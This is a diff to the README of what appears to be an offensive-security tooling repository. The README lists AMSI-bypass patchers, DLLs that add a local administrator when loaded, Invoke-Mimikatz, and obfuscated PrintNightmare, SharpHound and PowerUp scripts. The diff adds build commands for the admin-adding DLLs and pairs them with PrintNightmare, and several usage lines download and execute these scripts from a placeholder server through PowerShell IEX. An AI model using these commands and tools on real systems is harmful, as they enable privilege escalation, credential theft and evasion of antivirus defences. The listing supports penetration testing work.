@@ -29,8 +29,8 @@ Most of the stuff here is far from fancy or the best solution possible, sorry :(
 * amsi\_patching\_go.go: Patch AMSI in a given PID (go). 
 	* `.\amsi_patching_go.exe <PID>`
 * amsipythonbypass.zip: AMSI patching implemented in Python. Extracted from FluidAttacks [post](https://fluidattacks.com/blog/amsi-bypass-python/).
-* add\_user\_dll.cpp / adduser.dll: DLL that adds a new local admin user when loaded. Dynamically look up for local Administrators group name and add the user using windows APIs to avoid using net.exe/net1.exe.
-* add\_user\_dll2.cpp: DLL that adds a new local admin user when loaded (via system(net.exe...) method).
+* add\_user\_dll.cpp / adduser.dll: DLL that adds a new local admin user when loaded. Dynamically look up for local Administrators group name and add the user using windows APIs to avoid using net.exe/net1.exe. Compilation in Linux --> i686-w64-mingw32-gcc -shared -o adduser.dll add\_user\_dll.cpp
+* add\_user\_dll2.cpp: DLL that adds a new local admin user when loaded (via system(net.exe...) method). Compilation in Linux --> i686-w64-mingw32-gcc -shared -o adduser2.dll add\_user\_dll2.cpp
 * Invoke-Mimikatz.ps1: Powershell mimikatz with some minor bug fixes.
 * SpoolSample.exe: SpoolSample precompiled binary (printerbug).
 * bin\_to\_uuids.py: .bin to uuids converter, useful for UUID injection.
@@ -41,7 +41,7 @@ Most of the stuff here is far from fancy or the best solution possible, sorry :(
 * SharpPrintNightmare.exe: SharpPrintNightmare precompiled binary.
 * obf-sharphound.ps1: SharpHound.ps1 obfuscated by pyfuscation.
 	* `IEX (New-Object Net.WebClient).DownloadString("https://<SERVER>/obf-sharphound.ps1"); undertow -GdHcDvjN99 all`
-* obf-pnightmare.ps1: PrintNightmare obfuscated by pyfuscation.
+* obf-pnightmare.ps1: PrintNightmare obfuscated by pyfuscation. Use with DLL "add\_user\_dll.cpp" or "add\_user\_dll2.cpp"
 	* `IEX (New-Object Net.WebClient).DownloadString("https://<SERVER>/obf-pnightmare.ps1"); essentially -Dll "C:\Users\public\Desktop\adduser.dll"`
 * obf-pup.ps1: Powerup obfuscated by pyfuscation.
 	* `IEX (New-Object Net.WebClient).DownloadString("https://<SERVER>/obf-pup.ps1"); pave`
